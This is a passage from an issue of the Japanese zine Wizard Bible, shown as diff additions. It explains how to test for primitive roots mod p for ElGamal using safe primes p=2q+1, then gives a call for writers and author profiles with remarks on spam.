+　そのため、多項式時間で原始元を判定するような効率のよい方法を考えなけれ
+ばならない。判定アルゴリズムが効率的ならば、ランダムに選択するのも効率的
+なので、生成という全体で見ても効率的になる（図1参照）。
+
+（図1）http://security2600.sakura.ne.jp/main2/image3/gensi1.jpg
+
+
+■0x06.) 原始元の判定アルゴリズム
+
+　原始元の判定アルゴリズムに使えそうな次の事実がある。
+
+[補題]
+p-1がp-1=(q_0)^(e_0)×(q_1)^(e_1)×…×(q_t)^(e_t)のように素因数分解され
+たとする。このとき、次が成り立つ。
+
+「gがmod pの原始元である」⇔「0≦∀i≦t; g^{(p-1)/(q_i)}≠1 (mod p)」　←(*)
+
+　証明は省略して、例で考えておこう。p=11とすると、p-1=10の素因数分解は2^1
+×5^1である。
+
+[1]2が原始元かどうかを調べる
+
+・2^{(11-1)/5}=2^2=4≠1 (mod 11)
+・2^{(11-1)/2}=10≠1 (mod 11)
+
+　どちらの結果も1に一致しないので、2は原始元である。
+
+[2]3が原始元かどうかを調べる
+
+・3^{(11-1)/5}=3^2=9≠1 (mod 11)
+・3^{(11-1)/2}=3^5=9・9・3=81・3=4・3=12≡1 (mod 11)
+
+　1に一致するものがあったので、3は原始元ではない。
+
+　この定理を使うと、(*)をt+1回チェックするだけで、原始元かどうかを判定で
+きることになる。
+
+　ところが、この定理は原始元の判定アルゴリズムに利用できそうだが、実際に
+は使うことはできない。なぜならば、ElGamal暗号のときはp=1,024ビットなので、
+pを素因数分解することは無理である。この定理を使うためには、p-1の素因数分
+解を知らなければならないため、直接使うことは不可能である。そこで、実装に
+おいては図2のように行う。
+
+（図2）http://security2600.sakura.ne.jp/main2/image3/gensi2.jpg
+
+1：qをランダムに選び、素数判定アルゴリズム（次回のWBで解説する予定）で判
+定する。普通にMiller-Rabinアルゴリズムを使えばよい。
+
+2：次にp=2q+1を計算し、このpが素数かどうかを素数判定アルゴリズムで判定す
+る。
+
+3：もしp,qどちらも素数ならば、p-1の素因数は2とqとすでに知っているので、上
+記の原始元かどうかを判定するアルゴリズムを利用できる。図2の原始元生成アル
+ゴリズムはgの選択と原始元判定アルゴリズムの組合わせを意味としている。
+
+　ちなみに、たった2つの素因数なので、g^2≡1 (mod p)とg^q≡1 (mod p)のたっ
+た2回のチェックのみで原始元の判定ができる。もし両方の合同式が満たされない
+場合は、gはmod pの原始元となるわけである。
+
+
+■0x07.) 終わりに
+
+　暗号実装する際には、一般にライブラリを利用するはずなので、このようなこ
+とを意識しないかもしれない。しかし、暗号理論とその背景となる数学の学習に
+はうってつけなので、WBではあえて取り上げた。
+　次回は、暗号理論に関するアルゴリズムの中で花形のひとつとも言える素数判
+定アルゴリズムについて解説する予定である。
+
+
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+ --- 第8章: お知らせ ---
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+○Wizard Bible（http://wizardbible.org/）では随時、執筆ライターを募集して
+います。
+　扱う内容のテーマは広義での「under ground」です。例えばハッキングからピ
+ッキングなどと幅広い内容を考えています。また特殊な職業や趣味を持った方の
+レクチャーなども含まれます。
+　一回きりでも構いません。また必ず毎回連載する義務もありませんので、でき
+る範囲で構いません。気軽に声をかけてください。
+
+○Kenji AikoさんがQ&Aを作ってくれました。初めて参加する人でもわかりやすく
+書かれていますので、参考にしてください。
+
+http://wizardbible.org/wbQandA.html
+
+○Wizard Bibleに参加希望の方は気軽にメール（ipusiron@gmail.com）ください。
+
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+  ---- 第9章: 著者プロフィール ---
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+
+■金床
+●Job: プログラマー
+●Web: http://guardian.jumperz.net/, http://www.jumperz.net/
+●Mail: anvil@jumperz.net
+●Comment:
+　なんだか猛烈に忙しいのですが、ちょっとやってみたら1時間でできたので原稿
+書けました。原稿のほうが70分掛かってるのはどうなの(;´Д`)
+　まぁ、とにかく、時代はJavaだということです。
+●スパムについて:
+　手元ではPOPFileが頑張ってます。重いんだけど、Core2Duoにしてからは快適で
+すヽ(´ー`)ノ
+　一方でメールサーバーの方がスパマーからの大量の接続でちょっと負荷が気に
+なるレベル。対策しなきゃならんなぁ…。
+
+
+■Kenji Aiko
+●Job: Web Application Programmer
+●Web: http://ruffnex.oc.to/kenji/
+●Mail: kenji@ruffnex.oc.to
+●Team（Group): N/A
+●Comment:
+　えっと、最近は地味にウェブアプリとかFlashとか作ってます(^^;。なので、A
+ctionScript3なるものもやってたりします。これまでずっとアセンブラとか、C言
+語とか、カーネルとか、暗号とかやってたのと比べると、完全に別分野ですが、
+こっちはこっちでなかなか面白いかな、と思いながらやっております。
+●スパム状況と対策:
+　えっと、スパムについてですが、私のメールアドレス（kenji@ruffnex.oc.to）
+宛てには毎日だいたい30通くらいメールがくるのですが、そのうちだいたい30通
+くらいはスパムメールです。なので、ぶっちゃけ、全部なんですが。
+　ただ、ほとんどスパムだから、あまり対策の必要性もないです。30通程度なら
+余裕ですし。逆にスパムがなくなったら、「今日のメールは0件です」という若干
+さびしい日が来ないとも限らないですし。
+　スパムといっても、この程度ならモウマンタイ！　むしろウェルカムです。
+
+
+■Green boy 4
+●Job: Closed
+●Web: N/A
+●Mail: greenboy4@gmail.com
+●Team（Group): N/A
+●Comment:
+　まだまだ駆け出しのNo Skillな者ですが、いろいろと学んでいきたいと思いま
+す。
+
+
+■Defolos
+●Job: Student
+●Web: http://ruffnex.oc.to/defolos/
+●Mail: defolos@ruffnex.oc.to
+●Team（Group): none
+●Comment:
+　今回は実際にroot権限をとる実証を行ったわけですが、その途中Linuxを入れた
+HDDがぶち壊れるハプニングに見舞われました。ノートPCを代用してどうにか実証
+を終えたのですが、これからどうしようか考え中。
+　話は変わって、最近USBメモリに入れたUbuntuをデスクトップとして使ってます。
+パッケージ管理がすごく楽で、なかなかイイですよ。興味のある方は是非使って
+みてください。
+●スパム状況と対策
+　はい、スパムメールは多いです。1日15件ぐらいはメールが来ますが98%ぐらい
+はスパムですね。内訳としては、1.海外のワンクリック詐欺メール、2.国内のア
+ダルト係ワンクリック詐欺メール、3.海外のpdfのセキュリティホールを突いた攻
+撃メール、といった内容です。対策は特に行っていません。
+　正直、スパムが無くなればネットワークのインフラをもっと矮小化してもOKな
+んじゃないかと疑ってます。
+
+
+■IPUSIRON
+●Job: Student
+●Web: http://akademeia.info/
+●Mail: ipusiron@gmail.com
+●Team（Group): N/A
+●Comment:
+　修士論文の中間審査に向けて現在頑張っているところです。暗号技術の中でも
+commitment schemeというものをやってますが、これが何の役に立つものなのかな
+かなか説明しにくい。そのため、プレゼン用のスライドを作るときに結構困難を
+要しています。commitment schemeは直接アプリケーションで使うというより、部
+品として利用することが一般的であり、これが説明の困難さの要因のひとつとも
+いえると考えています。しかし部品とされる側が安全でなければ、それを利用し
+ている側も安全でなくなることがあるので、やりがいはあります。
+　ということで、commitment schemeについて気になる方は、次のURLで調べてみ
+てください。
+http://akademeia.info/index.php?commitment%20scheme
+●スパム状況と対策:
+　以前はruffnex.oc.toのメールアドレスを使っていた頃は、POPFileでベイジア
+ンフィルタリングを行っていました。しかし、フィルタリングの学習をさせるの
+が大変なのと、学習させても最終的にスパム用フォルダを覗いて大事なメールが
+紛れ込んでいないか確認する必要があり、現在はgmailを使っています。gmailを
+使い始めてからスパム対策は何もしていませんが、快適になりました。Web環境が
+あればどこでも確認できるのは便利ですが、アカウントが奪われてしまう危険性
+を考えるとちょっと怖いですね。
